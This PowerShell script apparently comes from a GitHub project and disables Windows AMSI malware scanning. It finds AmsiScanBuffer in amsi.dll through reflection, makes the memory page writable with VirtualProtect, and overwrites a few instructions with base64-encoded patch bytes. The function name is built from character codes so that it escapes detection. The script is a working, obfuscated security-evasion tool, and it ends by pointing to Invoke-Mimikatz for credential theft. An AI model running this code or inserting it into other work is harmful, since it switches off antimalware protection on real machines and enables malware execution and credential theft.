<#
    .SYNOPSIS
        Performs a global AMSI bypass by patching amsi.dll in memory.
    .DESCRIPTION
        This function modifies the AmsiScanBuffer function in amsi.dll to always return AMSI_RESULT_CLEAN, affecting all AMSI scanning within the current process.
    .LINK
     https://github.com/Chainski/GlobalAMSIBypass
#>
function LookupFunc {
    Param ($moduleName, $functionName)
    Write-Host "[*] Looking up $functionName in $moduleName"
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@();$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    $address = $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
    Write-Host "[+] Found $functionName at 0x$($address.ToString('X16'))"
    return $address
}
Write-Host "[*] Initializing global AMSI bypass via AmsiScanBuffer patch..."
Write-Host "[*] Locating AmsiScanBuffer in amsi.dll"
[IntPtr]$funcAddr = LookupFunc amsi.dll ('A'+[char]109+'s'+'i'+[char]83+'c'+[char]97+'n'+'B'+[char]117+'ff'+[char]101+'r')
$funcAddrLong = [Long]$funcAddr + 33;$funcAddr2 = [IntPtr]$funcAddrLong
Write-Host "[+] Targeting patch address: 0x$($funcAddr2.ToString('X16'))"
function getDelegateType {
    param([Type[]]$parameters,[Type]$returnType = [Void])
    Write-Host "[*] Creating delegate type for function pointer"
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('ReflectedDelegate')),[Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule',$false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[Reflection.CallingConventions]::Standard,$parameters).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual',$returnType, $parameters).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}
Write-Host "[*] Preparing VirtualProtect delegate"
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
Write-Host "[*] Changing memory protection to PAGE_EXECUTE_READWRITE"
$vp.Invoke($funcAddr2, 3, 0x40, [ref]$oldProtectionBuffer) | out-null
Write-Host "[*] Applying patch (xor ebx, ebx)"
$patchBytes = ([Convert]::FromBase64String('SDHA'))
[System.Runtime.InteropServices.Marshal]::Copy($patchBytes, 0, $funcAddr2, 3)
Write-Host "[*] Restoring memory protection to PAGE_EXECUTE_READ" 
$vp.Invoke($funcAddr2, 3, 0x20, [ref]$oldProtectionBuffer) | out-null
Write-Host "[!] Global AMSI bypass completed successfully!"
Write-Host "[!] Invoke-Mimikatz" -ForeGroundColor Green
